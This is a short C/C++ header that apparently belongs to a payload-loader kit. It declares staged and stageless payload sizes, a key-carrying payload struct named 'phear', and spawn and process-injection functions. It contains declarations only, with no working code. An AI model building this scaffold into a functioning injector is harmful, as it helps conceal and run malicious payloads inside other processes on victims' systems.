
//staged
//#define DATA_SIZE 1026		

//stageless
#define DATA_SIZE 271360


void spawn(void* buffer, int length, char* key);
extern "C" int inject(LPCVOID buffer, int length, char* processname);

typedef struct {
	int  offset;
	int  length;
	char key[4];
	int  gmh_offset;
	int  gpa_offset;
	char payload[DATA_SIZE];
} phear;

extern char data[DATA_SIZE];
